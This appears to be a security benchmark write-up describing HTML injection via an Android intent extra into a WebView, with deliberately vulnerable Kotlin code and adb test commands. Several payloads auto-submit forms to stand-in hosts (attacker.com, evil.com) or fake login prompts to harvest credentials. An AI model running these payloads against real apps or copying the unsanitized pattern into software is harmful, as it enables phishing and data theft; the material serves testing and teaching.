# oxo-android-ben45: HTML Injection Through Intent Parameter

## Vulnerability Overview

HTML Injection Through Intent Parameter occurs when an Android app's WebView component displays content received from intent parameters without proper sanitization. This vulnerability allows attackers to inject malicious HTML, CSS, and JavaScript code through intent extras, leading to Cross-Site Scripting (XSS) attacks within the WebView context.

## Attack Vector: Form-based Data Exfiltration

**Brief Explanation**: Injection of HTML forms that automatically submit sensitive data to attacker-controlled servers, or prompt users for additional sensitive information.

**Key Characteristics:**
- Creates hidden or visible forms for data collection
- Can auto-submit forms using JavaScript
- Exfiltrates data to external servers
- Can prompt for additional user credentials

**Vulnerable Code Pattern:**
```kotlin
val articleHtml = intent.getStringExtra("article_html") ?: "<p>No content</p>"
val fullHtml = """
    <html><body>
    <h1>News Reader</h1>
    $articleHtml
    </body></html>
""".trimIndent()
webView.loadDataWithBaseURL("https://newsreader.app", fullHtml, "text/html", "utf-8", null)  // VULNERABLE!
```

## Testing

```bash
# Auto-submitting data exfiltration form
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e article_html "<form id='steal' action='https://attacker.com/collect' method='POST'><input type='hidden' name='data' value='Stolen App Data'></form><script>document.getElementById('steal').submit()</script><p>Article content loading...</p>"

# Credential harvesting form
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e article_html "<div style='border:1px solid #ccc; padding:20px; background:#f9f9f9'><h3>Session Expired</h3><p>Please re-enter your credentials:</p><form><input type='text' placeholder='Username' onchange='alert(\"Stolen: \" + this.value)'><input type='password' placeholder='Password' onchange='alert(\"Password: \" + this.value)'><button type='button'>Login</button></form></div>"

# Fake survey form for data collection
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e article_html "<form><h3>Quick Survey - Win $100!</h3><p>Name: <input type='text' onblur='alert(\"Name: \" + this.value)'></p><p>Phone: <input type='tel' onblur='alert(\"Phone: \" + this.value)'></p><p>Email: <input type='email' onblur='alert(\"Email: \" + this.value)'></p><button type='button'>Submit</button></form>"

# Hidden iframe for background data theft
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e article_html "<p>Reading your article...</p><iframe src='javascript:alert(\"Background data theft executed!\")' style='display:none'></iframe>"

# Contact form with automatic submission
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e article_html "<form action='https://evil.com/steal' method='POST' id='contact'><h3>Contact Us</h3><input name='message' value='User visited vulnerable app' type='hidden'><textarea placeholder='Your message...' name='user_input'></textarea><br><button type='submit'>Send</button></form><script>setTimeout(function(){document.getElementById('contact').submit()}, 3000)</script>"
```

**Difficulty**: Easy

## Impact Assessment

- **Confidentiality**: Critical - Direct exfiltration of sensitive data to external servers
- **Integrity**: High - Can collect and manipulate user-provided information
- **Availability**: Medium - Can redirect users to malicious external sites
- **OWASP Mobile Top 10**: M7 - Client Code Quality, M2 - Insecure Data Storage
- **CWE**: CWE-79 (Cross-site Scripting), CWE-20 (Improper Input Validation), CWE-352 (Cross-Site Request Forgery)
